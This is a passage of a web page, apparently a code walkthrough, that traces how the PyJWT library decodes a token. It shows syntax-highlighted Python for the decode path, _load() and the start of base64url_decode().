</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">                </span><span class="token string-interpolation string">f&quot;Unsupported kwargs: </span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation builtin">tuple</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation">kwargs</span><span class="token string-interpolation interpolation punctuation">.</span><span class="token string-interpolation interpolation">keys</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">                RemovedInPyjwt3Warning</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">                stacklevel</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">            </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">        merged_options</span><span class="token punctuation">:</span><span class=""> SigOptions
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">        </span><span class="token keyword">if</span><span class=""> options </span><span class="token keyword">is</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">            merged_options </span><span class="token operator">=</span><span class=""> self</span><span class="token punctuation">.</span><span class="">options
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">        </span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">            merged_options </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">{</span><span class="token operator">**</span><span class="">self</span><span class="token punctuation">.</span><span class="">options</span><span class="token punctuation">,</span><span class=""> </span><span class="token operator">**</span><span class="">options</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">        verify_signature </span><span class="token operator">=</span><span class=""> merged_options</span><span class="token punctuation">[</span><span class="token string">&quot;verify_signature&quot;</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">        </span><span class="token keyword">if</span><span class=""> verify_signature </span><span class="token keyword">and</span><span class=""> </span><span class="token keyword">not</span><span class=""> algorithms </span><span class="token keyword">and</span><span class=""> </span><span class="token keyword">not</span><span class=""> </span><span class="token builtin">isinstance</span><span class="token punctuation">(</span><span class="">key</span><span class="token punctuation">,</span><span class=""> PyJWK</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">                </span><span class="token string">&#x27;It is required that you pass in a value for the &quot;algorithms&quot; argument when calling decode().&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">            </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">        payload</span><span class="token punctuation">,</span><span class=""> signing_input</span><span class="token punctuation">,</span><span class=""> header</span><span class="token punctuation">,</span><span class=""> signature </span><span class="token operator">=</span><span class=""> self</span><span class="token punctuation">.</span><span class="">_load</span><span class="token punctuation">(</span><span class="">jwt</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">        </span><span class="token keyword">if</span><span class=""> header</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;b64&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">True</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">is</span><span class=""> </span><span class="token boolean">False</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">            </span><span class="token keyword">if</span><span class=""> detached_payload </span><span class="token keyword">is</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">                </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">                    </span><span class="token string">&#x27;It is required that you pass in a value for the &quot;detached_payload&quot; argument to decode a message having the b64 header set to false.&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">                </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">            payload </span><span class="token operator">=</span><span class=""> detached_payload
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">            signing_input </span><span class="token operator">=</span><span class=""> </span><span class="token string">b&quot;.&quot;</span><span class="token punctuation">.</span><span class="">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="">signing_input</span><span class="token punctuation">.</span><span class="">rsplit</span><span class="token punctuation">(</span><span class="token string">b&quot;.&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class=""> payload</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">40</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">        </span><span class="token keyword">if</span><span class=""> verify_signature</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">            self</span><span class="token punctuation">.</span><span class="">_verify_signature</span><span class="token punctuation">(</span><span class="">signing_input</span><span class="token punctuation">,</span><span class=""> header</span><span class="token punctuation">,</span><span class=""> signature</span><span class="token punctuation">,</span><span class=""> key</span><span class="token punctuation">,</span><span class=""> algorithms</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">43</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">        </span><span class="token keyword">return</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">            </span><span class="token string">&quot;payload&quot;</span><span class="token punctuation">:</span><span class=""> payload</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">            </span><span class="token string">&quot;header&quot;</span><span class="token punctuation">:</span><span class=""> header</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">            </span><span class="token string">&quot;signature&quot;</span><span class="token punctuation">:</span><span class=""> signature</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">        </span><span class="token punctuation">}</span></code></pre></div></div>
<p>which calls <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">_load(...)</code></p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">    </span><span class="token keyword">def</span><span class=""> </span><span class="token function">_load</span><span class="token punctuation">(</span><span class="">self</span><span class="token punctuation">,</span><span class=""> jwt</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class=""> </span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class=""> Any</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token builtin">isinstance</span><span class="token punctuation">(</span><span class="">jwt</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">            jwt </span><span class="token operator">=</span><span class=""> jwt</span><span class="token punctuation">.</span><span class="">encode</span><span class="token punctuation">(</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> </span><span class="token builtin">isinstance</span><span class="token punctuation">(</span><span class="">jwt</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="token string-interpolation string">f&quot;Invalid token type. Token must be a </span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation builtin">bytes</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">            signing_input</span><span class="token punctuation">,</span><span class=""> crypto_segment </span><span class="token operator">=</span><span class=""> jwt</span><span class="token punctuation">.</span><span class="">rsplit</span><span class="token punctuation">(</span><span class="token string">b&quot;.&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">            header_segment</span><span class="token punctuation">,</span><span class=""> payload_segment </span><span class="token operator">=</span><span class=""> signing_input</span><span class="token punctuation">.</span><span class="">split</span><span class="token punctuation">(</span><span class="token string">b&quot;.&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">        </span><span class="token keyword">except</span><span class=""> ValueError </span><span class="token keyword">as</span><span class=""> err</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="token string">&quot;Not enough segments&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">from</span><span class=""> err
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">            header_data </span><span class="token operator">=</span><span class=""> base64url_decode</span><span class="token punctuation">(</span><span class="">header_segment</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">        </span><span class="token keyword">except</span><span class=""> </span><span class="token punctuation">(</span><span class="">TypeError</span><span class="token punctuation">,</span><span class=""> binascii</span><span class="token punctuation">.</span><span class="">Error</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">as</span><span class=""> err</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid header padding&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">from</span><span class=""> err
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">            header</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class=""> Any</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">=</span><span class=""> json</span><span class="token punctuation">.</span><span class="">loads</span><span class="token punctuation">(</span><span class="">header_data</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">        </span><span class="token keyword">except</span><span class=""> ValueError </span><span class="token keyword">as</span><span class=""> e</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="token string-interpolation string">f&quot;Invalid header string: </span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation">e</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">from</span><span class=""> e
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> </span><span class="token builtin">isinstance</span><span class="token punctuation">(</span><span class="">header</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid header string: must be a json object&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">            payload </span><span class="token operator">=</span><span class=""> base64url_decode</span><span class="token punctuation">(</span><span class="">payload_segment</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">        </span><span class="token keyword">except</span><span class=""> </span><span class="token punctuation">(</span><span class="">TypeError</span><span class="token punctuation">,</span><span class=""> binascii</span><span class="token punctuation">.</span><span class="">Error</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">as</span><span class=""> err</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid payload padding&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">from</span><span class=""> err
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">            signature </span><span class="token operator">=</span><span class=""> base64url_decode</span><span class="token punctuation">(</span><span class="">crypto_segment</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">        </span><span class="token keyword">except</span><span class=""> </span><span class="token punctuation">(</span><span class="">TypeError</span><span class="token punctuation">,</span><span class=""> binascii</span><span class="token punctuation">.</span><span class="">Error</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">as</span><span class=""> err</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">            </span><span class="token keyword">raise</span><span class=""> DecodeError</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid crypto padding&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">from</span><span class=""> err
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">        </span><span class="token keyword">return</span><span class=""> </span><span class="token punctuation">(</span><span class="">payload</span><span class="token punctuation">,</span><span class=""> signing_input</span><span class="token punctuation">,</span><span class=""> header</span><span class="token punctuation">,</span><span class=""> signature</span><span class="token punctuation">)</span></code></pre></div></div>
<p>which finally calls <a href="https://github.com/jpadilla/pyjwt/blob/master/jwt/utils.py#L25"><code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">base64url_decode(...)</code></a>:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">def</span><span class=""> </span><span class="token function">base64url_decode</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span><span class=""> Union</span><span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    input_bytes </span><span class="token operator">=</span><span class=""> force_bytes</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">    rem </span><span class="token operator">=</span><span class=""> </span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="">input_bytes</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">%</span><span class=""> </span><span class="token number">4</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">    </span><span class="token keyword">if</span><span class=""> rem </span><span class="token operator">&gt;</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">:</span><span class="">
